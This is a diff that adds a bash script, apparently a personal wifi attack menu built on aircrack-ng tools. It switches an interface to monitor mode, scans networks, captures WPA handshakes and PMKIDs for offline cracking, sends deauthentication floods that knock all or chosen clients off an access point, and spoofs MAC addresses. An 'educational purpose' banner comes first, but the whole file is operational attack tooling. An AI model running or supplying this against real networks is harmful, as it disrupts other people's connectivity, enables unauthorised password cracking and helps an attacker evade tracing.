@@ -1,0 +1,236 @@
+#! /bin/bash
+
+clear;
+echo "        <---------------------------------------------------------------->" | lolcat;
+figlet -f future "      Created By Leo     " | lolcat -a -d 10;
+echo "        <---------------------------------------------------------------->" | lolcat;
+echo;
+echo;
+figlet -f banner " WARNING " | lolcat;
+echo "<---------------------------------------------------------------->";
+echo "This is just for an Educational purpose. Do Not use this illegaly." ;
+echo "<---------------------------------------------------------------->";
+sleep 5;
+#<---------------------------------------Functions------------------------------------------>;
+choice_selection(){
+	echo;
+	echo "--------------------------------------------------------->";
+	echo "These are the available choices:";
+	echo ;
+	echo " 1. Enable/Disable Monitor Mode";
+	echo " 2. Normal Wifi Scan";
+	echo " 3. Wifi Scan with WPA-Handshake/PMKID capture";
+	echo " 4. Only Deautherization attack";
+	echo " 5. Wifi scan with WPA-Handshake/PMKID capture and Deautherization";
+	echo " 6. Spoof Specific Hardware's MAC address";
+	echo " 7. Exit";
+	echo ;
+	read -p "Please Select Your Choice Number:  " mainmenuchoiceno;
+	echo "--------------------------------------------------------->";
+	case $mainmenuchoiceno in
+		[1]* ) wlan_monitor;
+			choice_selection;;
+		[2]* ) wlan_identifier;
+			wlan_monitor_enable;
+			wifi_scanning;
+			wlan_monitor_disable;
+			choice_selection;;
+		[3]* ) wlan_identifier;
+			wlan_monitor_enable;
+			wifi_scanning;
+			wifi_scanning_hash_dump_detail_bssid;
+			wifi_scanning_hash_dump_detail_channel;
+			wifi_scanning_hash_dump_detail_name;
+			wifi_scanning_hash_dump_detail;
+			wifi_scanning_hash_dump;
+			wlan_monitor_disable;
+			choice_selection;;
+		[4]* ) wlan_identifier;
+			wlan_monitor_enable;
+			wifi_scanning;
+			wifi_scanning_hash_dump_detail_bssid;
+			wifi_scanning_hash_dump_detail_channel;
+			wifi_deauthenticate_count;
+			wifi_deauthenticate_reason_code;
+			wifi_deauthenticate_client;
+			wifi_deauthenticate;
+			wlan_monitor_disable;
+			choice_selection;;
+		[5]* ) wlan_identifier;
+			wlan_monitor_enable;
+			wifi_scanning;
+			wifi_scanning_hash_dump_detail_bssid;
+			wifi_scanning_hash_dump_detail_channel;
+			wifi_scanning_hash_dump_detail_name;
+			wifi_deauthenticate_count;
+			wifi_deauthenticate_reason_code ;
+			wifi_deauthenticate_client;
+			wifi_deauthenticate 
+			wifi_scanning_hash_dump;
+			wifi_monitor_disable;
+			choice_selection;;
+		[6]* ) change_mac;;
+		[7]* ) figlet -f future " Thank you!!! Have a great Day.";
+			exit;;
+		* ) echo "Please enter a valid Number.";
+			choice_selection;; 
+	esac;
+}
+wlan_identifier(){
+	echo;
+	echo "These are the available interfaces as mentioned below:";
+	echo "------------------------------------------------>";
+	ifconfig | grep wlan -A 5;
+	echo ;
+	echo "------------------------------------------------>";
+	read -p "Select the WLAN interface you want to use: wlan" wlanint;
+	echo ;
+	echo "--------------------------------------------------------->";
+}
+wlan_monitor(){
+	echo;
+	echo " These are available choices: ";
+	echo ;
+	echo " 1. Enable Monitor Mode";
+	echo " 2. Disable Monitor Mode";
+	echo " 3. Back to Main Menu";
+	read -p "Please Select Your Choice Number:  " firstmenuchoiceno;
+	case $firstmenuchoiceno in
+		[1]* ) wlan_identifier;
+			wlan_monitor_enable;;
+		[2]* ) wlan_identifier;
+			wlan_monitor_disable;;
+		[3]* ) choice_selection;;
+		* ) echo " Please Select a valid Option.";
+		    wlan_monitor;;
+	esac;
+	echo "--------------------------------------------------------->";
+}
+wlan_monitor_enable(){
+	echo;
+	echo "Selected WLAN is wlan$wlanint";
+	echo "------------------------------------------------>";
+	echo "Starting Monitor Mode...";
+	echo "------------------------------------------------>";
+	ifconfig wlan$wlanint down;
+	iwconfig wlan$wlanint mode monitor;
+	ifconfig wlan$wlanint up;
+	airmon-ng start wlan$wlanint;
+	airmon-ng check kill;
+	echo "------------------------------------------------>";
+	echo "Monitor Mode Activated!!";
+	echo "------------------------------------------------>";
+	echo ;
+}
+wlan_monitor_disable(){
+	echo;
+	echo "Selected WLAN is wlan$wlanint";
+	echo "------------------------------------------------>";
+	echo "Disabling Monitor Mode...";
+	echo "------------------------------------------------>";
+	echo ;
+	ifconfig wlan$wlanint down;
+	iwconfig wlan$wlanint mode managed;
+	ifconfig wlan$wlanint up;
+	airmon-ng stop wlan0;
+	echo "------------------------------------------------>";
+	echo "Monitor Mode Deactivated!!";
+	echo "------------------------------------------------>";
+	service NetworkManager restart;
+	echo ;
+	echo "------------------------------------------------>";
+	echo "Network Manager Activated.";
+	echo "------------------------------------------------>";
+}
+wifi_scanning(){
+	read -p "Start Scanning the Area for WIFI networks?[Y/N] " scan;
+	case $scan in 
+		[Yy]* )airodump-ng wlan$wlanint;;
+		[Nn]* );;
+	esac;
+}
+wifi_scanning_hash_dump_detail_bssid(){
+	read -p " Enter the BSSID: " bssid;
+	case $bssid in
+		"" ) echo "Please Enter a valid BSSID";
+			wifi_scanning_hash_dump_detail_bssid;;
+		* ) ;;
+	esac;
+}
+wifi_scanning_hash_dump_detail_channel(){
+	read -p " Enter the Channel: " channel;
+	case $channel in
+		"" ) echo " Please Specify a Channel";
+			wifi_scanning_hash_dump_detail_channel;;
+		* ) channelname="-c $channel";
+			ifconfig wlan$wlanint down;
+			iwconfig wlan$wlanint channel $channel;
+			ifconfig wlan$wlanint up;;
+	esac;
+}
+wifi_scanning_hash_dump_detail_name(){
+	read -p " Give a name for the file: " name;
+	case $name in
+		"" ) name="wifihash";;
+		* ) ;;
+	esac;
+}
+wifi_scanning_hash_dump_detail(){
+	echo "--------------------------------------------------------------->";
+	echo "You selected the BSSID of $bssid and the channel is $channel.You are going to silently sniff for somebody to connect to the WIFI and no Deautherization packets will be sent to the AP. The Hash will be stored with the name of $name.";
+	echo "--------------------------------------------------------------->";
+	sleep 2;
+}
+wifi_scanning_hash_dump(){
+	airodump-ng $channelname --bssid $bssid -w $name wlan$wlanint	;
+}
+wifi_deauthenticate_count(){
+	read -p "How many times Deauth Packets should be sent?[Default=50] " deauthcount;
+	case $deauthcount in
+		"" ) deauthcount=50;;
+		* ) ;;
+	esac;
+}
+wifi_deauthenticate_reason_code(){
+	read -p "Do you want to specify any Reason code?[Default=7] " deauthrc;
+	case $deauthrc in
+		"" ) deauthrc=7;;
+		* ) ;;
+	esac;
+}
+wifi_deauthenticate_client(){
+	read -p "Any client's BSSID to disconnect[Default is all clients]: " clientbssid;
+	case $clientbssid in
+		"" ) echo "Trying to Deauthenticate all clients.";
+			clientbssid="";;
+		* ) clientbssid="-c $clientbssid";;
+	esac;
+}
+wifi_deauthenticate(){
+	aireplay-ng --deauth $deauthcount --deauth-rc $deauthrc -a $bssid $clientbssid wlan$wlanint;
+}
+change_mac(){
+	echo;
+	ifconfig;
+	echo;
+	echo "----------------------------------------------------------------->";
+	read -p "Enter name of the Interface to Spoof the MAC address of[example:eth0,wlan0 etc]: " spoofinterface;
+	ifconfig $spoofinterface down;
+	macchanger -r $spoofinterface;
+	macchanger -r $spoofinterface;
+	macchanger -r $spoofinterface;
+	ifconfig $spoofinterface up;
+	ifconfig | grep $spoofinterface;
+	macchanger -s $spoofinterface;
+	echo "-------------------------------------------------------------------------->";
+	echo "Successfully changed the MAC address of the device 3 times for security.";
+	echo "-------------------------------------------------------------------------->";
+}
+
+#<-----------------Actions----------------------->
+if (($UID==0))
+	then choice_selection;
+fi
+if (($UID!=0))
+	then figlet -f future " Please run as Root. ";
+fi
